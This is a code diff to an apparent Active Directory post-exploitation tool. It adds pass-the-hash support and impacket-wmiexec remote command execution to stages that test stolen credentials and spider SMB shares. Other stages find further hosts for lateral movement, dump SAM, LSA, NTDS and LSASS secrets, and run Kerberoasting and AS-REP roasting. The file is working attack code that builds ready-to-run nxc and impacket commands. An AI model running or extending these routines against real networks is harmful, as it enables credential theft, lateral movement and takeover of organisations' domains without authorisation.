@@ -37,6 +37,7 @@ OPTIONS = {
     "RPORT": 445,
     "USERNAME": "",
     "PASSWORD": "",
+    "NTLM_HASH": "",
     "DOMAIN": "",
     "OUTPUT_DIR": "",
     "MODE": "FULL",
@@ -45,12 +46,13 @@ OPTIONS = {
     "VERBOSE": False,
 }
 
-REQUIRED = {"RHOSTS": True, "USERNAME": True, "PASSWORD": True, "DOMAIN": True}
+REQUIRED = {"RHOSTS": True, "USERNAME": True, "DOMAIN": True}
 DESCRIPTIONS = {
     "RHOSTS": "Target DC or domain-joined host IP",
     "RPORT": "Primary service port (default 445)",
     "USERNAME": "Username for authentication (e.g. visitor, admin@corp.local)",
     "PASSWORD": "Password for authentication",
+    "NTLM_HASH": "NTLM hash for pass-the-hash (optional, overrides password for exec)",
     "DOMAIN": "Active Directory domain (e.g. COOCTUS.CORP)",
     "OUTPUT_DIR": "Output directory (auto-generated if empty)",
     "MODE": "FULL | ENUM | DUMP | KERB | CRACK | SPRAY (which stages to run)",
@@ -92,11 +94,11 @@ def _run_cmd(cmd, timeout=120, capture=True):
         return "", str(e), -1
 
 
-def _nxc_run(service, target, user, passwd, extra_args="", timeout=60):
-    """Run nxc command and return output."""
+def _nxc_run(service, target, user, passwd, extra_args="", timeout=60, ntlm_hash=None):
+    """Run nxc command and return output. Supports pass-the-hash via -H flag."""
     nxc = _find_nxc()
     if not nxc:
-        return ""
+        return "", ""
     # Build user formats: bare, DOMAIN\user, user@domain
     bare = user
     if "\\" in user:
@@ -110,8 +112,14 @@ def _nxc_run(service, target, user, passwd, extra_args="", timeout=60):
         formats.append(f"{domain}\\{bare}")
         formats.append(f"{bare}@{domain.lower()}")
 
+    # nxc supports -H for pass-the-hash when password is empty
+    if ntlm_hash:
+        auth_flag = f'-H "{ntlm_hash}"'
+    else:
+        auth_flag = f'-p "{passwd}"'
+
     for fmt in formats:
-        cmd = f'{nxc} {service} {target} -u "{fmt}" -p "{passwd}" {extra_args}'
+        cmd = f'{nxc} {service} {target} -u "{fmt}" {auth_flag} {extra_args}'
         stdout, stderr, rc = _run_cmd(cmd, timeout=timeout)
         output = stdout + stderr
         if "PWND!" in output or "[+]" in output:
@@ -119,14 +127,68 @@ def _nxc_run(service, target, user, passwd, extra_args="", timeout=60):
     return "", ""
 
 
-def _exec_smb(target, user, passwd, cmd_str, timeout=60):
-    """Execute a command on target via nxc smb -x."""
+def _strip_impacket_banner(output):
+    """Remove impacket banners and shell prompts from wmiexec output."""
+    lines = output.splitlines()
+    cleaned = []
+    for line in lines:
+        stripped = line.strip()
+        # Skip impacket banners, SMB info, shell metadata
+        if stripped.startswith("Impacket v"):
+            continue
+        if stripped.startswith("[*] SMBv"):
+            continue
+        if stripped.startswith("[*]"):
+            continue
+        if stripped.startswith("[!]"):
+            continue
+        if stripped.startswith("[+]"):
+            continue
+        if stripped.startswith("Impacket"):
+            continue
+        if "Launching semi-interactive shell" in stripped:
+            continue
+        if "Press help for extra shell" in stripped:
+            continue
+        # Skip Windows shell prompt lines (e.g., "C:\>" or "C:\Users\administrator> ")
+        if stripped and all(c in "C:\\/> " for c in stripped):
+            continue
+        cleaned.append(line)
+    return "\n".join(cleaned)
+
+
+def _exec_smb(target, user, passwd, cmd_str, timeout=60, ntlm_hash=None, domain=None):
+    """Execute a command on target via impacket-wmiexec (or nxc smb -x as fallback).
+
+    impacket-wmiexec supports direct command execution and returns output.
+    nxc -x never returns output — use it only as a fallback for auth testing.
+    """
+    wmiexec = shutil.which("impacket-wmiexec")
+    if wmiexec:
+        if ntlm_hash:
+            auth = f"-hashes :{ntlm_hash}"
+            # Use / not \ for impacket target format — \ gets eaten by shell
+            fmt_user = f"{domain}/{user}" if domain else user
+        elif domain:
+            auth = f'-p "{passwd}"'
+            fmt_user = f"{domain}/{user}"
+        else:
+            auth = f'-p "{passwd}"'
+            fmt_user = user
+
+        target_fmt = f"{fmt_user}@{target}"
+        cmd_escaped = cmd_str.replace('"', '\\"')
+        full = f'{wmiexec} {auth} {target_fmt} "{cmd_escaped}"'
+        stdout, _, rc = _run_cmd(full, timeout=timeout)
+        if rc == 0 and stdout.strip():
+            return _strip_impacket_banner(stdout.strip())
+        # If wmiexec failed, try nxc as fallback
     nxc = _find_nxc()
-    if not nxc:
-        return ""
-    full = f'{nxc} smb {target} -u "{user}" -p "{passwd}" -x "{cmd_str}"'
-    stdout, _, _ = _run_cmd(full, timeout=timeout)
-    return stdout
+    if nxc:
+        full = f'{nxc} smb {target} -u "{user}" -p "{passwd}" -x "{cmd_str}"'
+        stdout, _, _ = _run_cmd(full, timeout=timeout)
+        return stdout
+    return ""
 
 
 # ─── Save helpers ──────────────────────────────────────────────────────────────
@@ -149,13 +211,13 @@ def _save_hash(output_dir, hash_line, source="unknown"):
 
 # ─── Stage: Test credentials ──────────────────────────────────────────────────
 
-def _test_credentials(target, user, passwd, domain, output_dir):
+def _test_credentials(target, user, passwd, domain, output_dir, ntlm_hash=None):
     """Test credentials on SMB, WinRM, RDP, LDAP. Returns dict of results."""
     print(f"\n{'='*60}")
     print("  STAGE 1: Testing Credentials on All Services")
     print(f"{'='*60}")
 
-    _save_cred(output_dir, domain, user, passwd, "initial")
+    _save_cred(output_dir, domain, user, passwd or "(pass-the-hash)", "initial")
 
     services = ["smb", "winrm", "rdp", "ldap"]
     results = {}
@@ -164,7 +226,8 @@ def _test_credentials(target, user, passwd, domain, output_dir):
     working_user = user
 
     for svc in services:
-        output, fmt_used = _nxc_run(svc, target, user, passwd)
+        output, fmt_used = _nxc_run(svc, target, user, passwd,
+                                    ntlm_hash=ntlm_hash)
         if output:
             if "PWND!" in output:
                 print(f"  [+] {svc.upper()} PWND!  (user format: {fmt_used})")
@@ -225,8 +288,8 @@ def _rdp_screenshot(target, user, passwd, output_dir):
 
 # ─── Stage: Shared drives enumeration ────────────────────────────────────────
 
-def _enumerate_shares(target, user, passwd, domain, output_dir):
-    """Enumerate all accessible SMB shares, check permissions, spider content.
+def _enumerate_shares(target, user, passwd, domain, output_dir, ntlm_hash=None):
+    """Enumerate all accessible SMB shares, check permissions, spider content. Supports pass-the-hash.
 
     Steps:
       1. nxc --shares  → list all shares with READ/WRITE/DENY access flags
@@ -255,13 +318,16 @@ def _enumerate_shares(target, user, passwd, domain, output_dir):
 
     user_fmt = f"{domain}\\{bare}" if domain else bare
 
+    # Auth flag: -p for password, -H for hash
+    auth_flag = f'-H "{ntlm_hash}"' if ntlm_hash else f'-p "{passwd}"'
+
     shares_found = []
     accessible_shares = []
     lateral_hosts = []
 
     # ── Step 1: nxc --shares ──────────────────────────────────────────────
     print("  [1/5] Enumerating shares via nxc --shares ...")
-    cmd = f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" --shares'
+    cmd = f'{nxc} smb {target} -u "{user_fmt}" {auth_flag} --shares'
     stdout, _, rc = _run_cmd(cmd, timeout=60)
 
     shares_file = os.path.join(share_dir, "all_shares.txt")
@@ -357,7 +423,7 @@ def _enumerate_shares(target, user, passwd, domain, output_dir):
             continue
         # CHECK means blank permissions — try --dir to confirm access
         if sh["access"] == "CHECK":
-            dir_cmd = f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" --share {name} --dir'
+            dir_cmd = f'{nxc} smb {target} -u "{user_fmt}" {auth_flag} --share {name} --dir'
             dir_out, _, dir_rc = _run_cmd(dir_cmd, timeout=30)
             if dir_out and "STATUS_ACCESS_DENIED" not in dir_out and "Error" not in dir_out:
                 sh["access"] = "READ"
@@ -371,7 +437,7 @@ def _enumerate_shares(target, user, passwd, domain, output_dir):
             continue
 
         print(f"      [*] {name} ({sh['access']}) — listing root ...")
-        dir_cmd = f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" --share {name} --dir'
+        dir_cmd = f'{nxc} smb {target} -u "{user_fmt}" {auth_flag} --share {name} --dir'
         dir_out, _, _ = _run_cmd(dir_cmd, timeout=30)
         dir_outputs[name] = dir_out or ""
 
@@ -407,7 +473,7 @@ def _enumerate_shares(target, user, passwd, domain, output_dir):
     for share_name in accessible_shares:
         print(f"      [*] Spidering {share_name} ...")
         spider_cmd = (
-            f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" '
+            f'{nxc} smb {target} -u "{user_fmt}" {auth_flag} '
             f'--share {share_name} --spider {share_name} '
             f'--spider-folder "." --content'
         )
@@ -442,7 +508,7 @@ def _enumerate_shares(target, user, passwd, domain, output_dir):
     # We use nxc ldap -M dump-computers instead — far more reliable.
     print("  [4/5] Discovering other domain-joined computers ...")
     hosts_from_ldap = []
-    ldap_dump = f'{nxc} ldap {target} -u "{user_fmt}" -p "{passwd}" -M dump-computers'
+    ldap_dump = f'{nxc} ldap {target} -u "{user_fmt}" {auth_flag} -M dump-computers'
     ldap_out, _, _ = _run_cmd(ldap_dump, timeout=30)
     ldap_file = os.path.join(share_dir, "ldap_computers.txt")
     with open(ldap_file, "w") as f:
@@ -488,7 +554,7 @@ def _enumerate_shares(target, user, passwd, domain, output_dir):
         if host.lower() == target.lower():
             continue
         print(f"      [*] {host} — listing shares ...")
-        hcmd = f'{nxc} smb {host} -u "{user_fmt}" -p "{passwd}" --shares'
+        hcmd = f'{nxc} smb {host} -u "{user_fmt}" {auth_flag} --shares'
         hout, _, hrc = _run_cmd(hcmd, timeout=45)
         if hout:
             hfile = os.path.join(share_dir, f"shares_{re.sub(r'[^\\w\\-.]', '_', host)}.txt")
@@ -549,7 +615,7 @@ def _enumerate_shares(target, user, passwd, domain, output_dir):
 
 # ─── Stage: Full enumeration ──────────────────────────────────────────────────
 
-def _full_enum(target, user, passwd, domain, output_dir):
+def _full_enum(target, user, passwd, domain, output_dir, ntlm_hash=None):
     """Full host enumeration via SMB exec commands."""
     print(f"\n{'='*60}")
     print("  STAGE 2: Full Host Enumeration")
@@ -580,7 +646,8 @@ def _full_enum(target, user, passwd, domain, output_dir):
     count = 0
     for fname, cmd_str in commands.items():
         print(f"  [*] {fname.replace('.txt', '').replace('_', ' ').title()}...")
-        output = _exec_smb(target, user, passwd, cmd_str, timeout=45)
+        output = _exec_smb(target, user, passwd, cmd_str, timeout=45,
+                           ntlm_hash=ntlm_hash, domain=domain)
         if output:
             with open(os.path.join(enum_dir, fname), "w") as f:
                 f.write(output)
@@ -592,8 +659,8 @@ def _full_enum(target, user, passwd, domain, output_dir):
 
 # ─── Stage: Credential dumping ────────────────────────────────────────────────
 
-def _dump_creds(target, user, passwd, domain, output_dir):
-    """Dump SAM, LSA, NTDS, LSASS via nxc."""
+def _dump_creds(target, user, passwd, domain, output_dir, ntlm_hash=None):
+    """Dump SAM, LSA, NTDS, LSASS via nxc. Supports pass-the-hash."""
     print(f"\n{'='*60}")
     print("  STAGE 3: Credential Dumping")
     print(f"{'='*60}")
@@ -608,10 +675,13 @@ def _dump_creds(target, user, passwd, domain, output_dir):
 
     creds = {"sam": [], "lsa": [], "ntds": [], "lsass": []}
 
+    # Auth flag: -p for password, -H for hash
+    auth_flag = f'-H "{ntlm_hash}"' if ntlm_hash else f'-p "{passwd}"'
+
     # SAM
     print("  [*] Dumping SAM...")
     sam_file = os.path.join(dump_dir, "sam.txt")
-    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --sam'
+    cmd = f'{nxc} smb {target} -u "{user}" {auth_flag} --sam'
     stdout, _, _ = _run_cmd(cmd, timeout=90)
     if stdout:
         with open(sam_file, "w") as f:
@@ -628,7 +698,7 @@ def _dump_creds(target, user, passwd, domain, output_dir):
 
     # LSA
     print("  [*] Dumping LSA...")
-    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --lsa'
+    cmd = f'{nxc} smb {target} -u "{user}" {auth_flag} --lsa'
     stdout, _, _ = _run_cmd(cmd, timeout=90)
     if stdout:
         with open(os.path.join(dump_dir, "lsa.txt"), "w") as f:
@@ -638,7 +708,7 @@ def _dump_creds(target, user, passwd, domain, output_dir):
     # NTDS
     print("  [*] Attempting NTDS dump...")
     ntds_file = os.path.join(dump_dir, "ntds.txt")
-    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --ntds'
+    cmd = f'{nxc} smb {target} -u "{user}" {auth_flag} --ntds'
     stdout, _, _ = _run_cmd(cmd, timeout=180)
     if stdout:
         with open(ntds_file, "w") as f:
@@ -654,7 +724,7 @@ def _dump_creds(target, user, passwd, domain, output_dir):
 
     # LSASS
     print("  [*] Attempting LSASS dump...")
-    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" -M lsassy'
+    cmd = f'{nxc} smb {target} -u "{user}" {auth_flag} -M lsassy'
     stdout, _, _ = _run_cmd(cmd, timeout=60)
     if stdout:
         with open(os.path.join(dump_dir, "lsass.txt"), "w") as f:
@@ -668,8 +738,8 @@ def _dump_creds(target, user, passwd, domain, output_dir):
 
 # ─── Stage: LDAP enumeration ──────────────────────────────────────────────────
 
-def _ldap_enum(target, user, passwd, domain, output_dir):
-    """LDAP enumeration: LAPS, GMSA, delegation, kerberoastable, AS-REP."""
+def _ldap_enum(target, user, passwd, domain, output_dir, ntlm_hash=None):
+    """LDAP enumeration: LAPS, GMSA, delegation, kerberoastable, AS-REP. Supports pass-the-hash."""
     print(f"\n{'='*60}")
     print("  STAGE 4: LDAP Enumeration")
     print(f"{'='*60}")
@@ -681,6 +751,9 @@ def _ldap_enum(target, user, passwd, domain, output_dir):
     if not nxc:
         print("  [-] nxc not found — skipping LDAP enumeration")
         return {}
+
+    # Auth flag: -p for password, -H for hash
+    auth_flag = f'-H "{ntlm_hash}"' if ntlm_hash else f'-p "{passwd}"'
 
     checks = {
         "laps.txt": "-M laps",
@@ -694,7 +767,7 @@ def _ldap_enum(target, user, passwd, domain, output_dir):
     for fname, module_arg in checks.items():
         label = fname.replace(".txt", "").replace("_", " ").title()
         print(f"  [*] Checking {label}...")
-        cmd = f'{nxc} ldap {target} -u "{user}" -p "{passwd}" {module_arg}'
+        cmd = f'{nxc} ldap {target} -u "{user}" {auth_flag} {module_arg}'
         stdout, _, _ = _run_cmd(cmd, timeout=60)
         if stdout:
             with open(os.path.join(ldap_dir, fname), "w") as f:
@@ -710,8 +783,8 @@ def _ldap_enum(target, user, passwd, domain, output_dir):
 
 # ─── Stage: Kerberoasting ─────────────────────────────────────────────────────
 
-def _kerberoast(target, user, passwd, domain, output_dir):
-    """Kerberoast SPN accounts via GetUserSPNs."""
+def _kerberoast(target, user, passwd, domain, output_dir, ntlm_hash=None):
+    """Kerberoast SPN accounts via GetUserSPNs. Supports pass-the-hash."""
     print(f"\n{'='*60}")
     print("  STAGE 5: Kerberoasting")
     print(f"{'='*60}")
@@ -724,7 +797,11 @@ def _kerberoast(target, user, passwd, domain, output_dir):
     timestamp = datetime.now().strftime("%H%M%S")
     outfile = os.path.join(output_dir, f"kerberoast_{timestamp}.txt")
 
-    auth = f"{domain}/{user}:{passwd}"
+    # impacket supports -hashes for pass-the-hash
+    if ntlm_hash:
+        auth = f"-hashes :{ntlm_hash} {domain}/{user}"
+    else:
+        auth = f"{domain}/{user}:{passwd}"
     cmd = f'{tool} -dc-ip {target} {auth} -request -outputfile {outfile}'
     stdout, stderr, rc = _run_cmd(cmd, timeout=120)
 
@@ -740,8 +817,8 @@ def _kerberoast(target, user, passwd, domain, output_dir):
 
 # ─── Stage: AS-REP Roasting ───────────────────────────────────────────────────
 
-def _asreproast(target, user, passwd, domain, output_dir):
-    """AS-REP roast accounts without pre-auth required."""
+def _asreproast(target, user, passwd, domain, output_dir, ntlm_hash=None):
+    """AS-REP roast accounts without pre-auth required. Supports pass-the-hash."""
     print(f"\n{'='*60}")
     print("  STAGE 5b: AS-REP Roasting")
     print(f"{'='*60}")
@@ -754,9 +831,14 @@ def _asreproast(target, user, passwd, domain, output_dir):
     timestamp = datetime.now().strftime("%H%M%S")
     outfile = os.path.join(output_dir, f"asrep_{timestamp}.txt")
 
-    auth = f"{domain}/{user}:{passwd}"
-    cmd = f'{tool} {domain}/ -usersfile <(echo {user}) -dc-ip {target} -format hashcat -outputfile {outfile}'
-    stdout, stderr, rc = _run_cmd(cmd, timeout=60)
+    # impacket supports -hashes for pass-the-hash
+    if ntlm_hash:
+        auth = f"-hashes :{ntlm_hash} {domain}/{user}"
+    else:
+        auth = f"{domain}/{user}:{passwd}"
+    cmd = f'{tool} {auth} -usersfile /dev/stdin -dc-ip {target} -format hashcat -outputfile {outfile}'
+    user_input = f"{user}\n"
+    stdout, stderr, rc = _run_cmd(f'echo "{user}" | {cmd}', timeout=60)
 
     if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
         print(f"  [+] AS-REP hashes saved to {outfile}")
@@ -973,12 +1055,15 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
     user = opts.get("USERNAME", "")
     passwd = opts.get("PASSWORD", "")
     domain = opts.get("DOMAIN", "")
+    ntlm_hash = opts.get("NTLM_HASH", "")
     verbose = opts.get("VERBOSE", False)
 
     log.info(f"ad_post_enum run target={rhosts} mode={mode}")
 
-    if not rhosts or not user or not passwd or not domain:
-        return {"success": False, "error": "RHOSTS, USERNAME, PASSWORD, DOMAIN all required"}
+    if not rhosts or not user or not domain:
+        return {"success": False, "error": "RHOSTS, USERNAME, DOMAIN all required"}
+    if not passwd and not ntlm_hash:
+        return {"success": False, "error": "PASSWORD or NTLM_HASH required"}
 
     if mode.upper() == "CHECK":
         ok, msg = check(opts, target)
@@ -999,6 +1084,8 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
     print(f"  Target:  {rhosts}")
     print(f"  Domain:  {domain}")
     print(f"  User:    {domain}\\{user}")
+    if ntlm_hash:
+        print(f"  Hash:    :{ntlm_hash[:8]}... (pass-the-hash)")
     print(f"  Output:  {output_dir}")
     print(f"{'#'*60}")
 
@@ -1013,9 +1100,12 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
         "stages": {},
     }
 
+    working_user = user
+
     # Step 1: Test credentials
     if "TEST" in steps:
-        svc_result = _test_credentials(rhosts, user, passwd, domain, output_dir)
+        svc_result = _test_credentials(rhosts, working_user, passwd, domain, output_dir,
+                                       ntlm_hash=ntlm_hash)
         result["stages"]["test"] = svc_result
         if not svc_result["any_pwnd"]:
             print(f"\n  [-] Credentials don't work on any service — aborting")
@@ -1023,17 +1113,17 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
             _print_summary(output_dir, domain)
             return result
         working_user = svc_result["working_user"]
-    else:
-        working_user = user
 
     # Step 2: Full enumeration
     if "ENUM" in steps:
-        enum_result = _full_enum(rhosts, working_user, passwd, domain, output_dir)
+        enum_result = _full_enum(rhosts, working_user, passwd, domain, output_dir,
+                                 ntlm_hash=ntlm_hash)
         result["stages"]["enum"] = enum_result
 
     # Step 3: Credential dump
     if "DUMP" in steps:
-        creds = _dump_creds(rhosts, working_user, passwd, domain, output_dir)
+        creds = _dump_creds(rhosts, working_user, passwd, domain, output_dir,
+                            ntlm_hash=ntlm_hash)
         result["stages"]["dump"] = {
             "sam": len(creds.get("sam", [])),
             "lsa": len(creds.get("lsa", [])),
@@ -1043,13 +1133,16 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
 
     # Step 4: LDAP enumeration
     if "LDAP" in steps:
-        ldap_result = _ldap_enum(rhosts, working_user, passwd, domain, output_dir)
+        ldap_result = _ldap_enum(rhosts, working_user, passwd, domain, output_dir,
+                                 ntlm_hash=ntlm_hash)
         result["stages"]["ldap"] = {k: len(v) for k, v in ldap_result.items()}
 
     # Step 5: Kerberoast + AS-REP
     if "KERB" in steps:
-        kerb_file = _kerberoast(rhosts, working_user, passwd, domain, output_dir)
-        asrep_file = _asreproast(rhosts, working_user, passwd, domain, output_dir)
+        kerb_file = _kerberoast(rhosts, working_user, passwd, domain, output_dir,
+                                ntlm_hash=ntlm_hash)
+        asrep_file = _asreproast(rhosts, working_user, passwd, domain, output_dir,
+                                  ntlm_hash=ntlm_hash)
         result["stages"]["kerb"] = {
             "kerberoast": kerb_file or None,
             "asrep": asrep_file or None,
@@ -1080,7 +1173,8 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
 
     # Step 9: Shared drives enumeration
     if "SHARE" in steps:
-        share_result = _enumerate_shares(rhosts, working_user, passwd, domain, output_dir)
+        share_result = _enumerate_shares(rhosts, working_user, passwd, domain, output_dir,
+                                         ntlm_hash=ntlm_hash)
         result["stages"]["shares"] = share_result
 
     _print_summary(output_dir, domain)
